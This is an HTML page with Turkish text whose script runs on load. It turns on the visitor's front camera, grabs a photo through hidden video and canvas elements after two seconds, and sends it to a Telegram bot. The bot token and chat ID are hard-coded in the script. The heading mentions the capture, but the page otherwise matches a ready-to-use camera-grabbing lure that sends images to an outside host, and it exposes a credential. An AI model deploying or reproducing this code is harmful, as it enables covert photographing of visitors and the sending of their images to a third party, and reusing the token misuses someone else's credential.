# Telegram1<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Telegram Botuna Kamera Görüntüsü</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 40px; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <h2>📷 Kamera görüntüsü alınacak ve Telegram botuna gönderilecek</h2>
  <p>Lütfen kamera izni verin.</p>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const TELEGRAM_BOT_TOKEN = "7996559452:AAFUZHzo4URmpsKOXVemh5EkLWvzv-BWQTg";
    const CHAT_ID = "5012869228";

    async function captureAndSendToTelegram() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });

        video.srcObject = stream;

        // 2 saniye bekle
        await new Promise(resolve => setTimeout(resolve, 2000));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "photo.png");

          const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

          const res = await fetch(telegramUrl, {
            method: "POST",
            body: formData
          });

          if (res.ok) {
            alert("📤 Fotoğraf Telegram'a gönderildi!");
          } else {
            alert("❌ Gönderim başarısız.");
          }

          // Kamerayı durdur
          stream.getTracks().forEach(track => track.stop());
        }, "image/png");

      } catch (err) {
        alert("Kamera erişimi alınamadı: " + err.message);
      }
    }

    window.onload = captureAndSendToTelegram;
  </script>
</body>
</html>
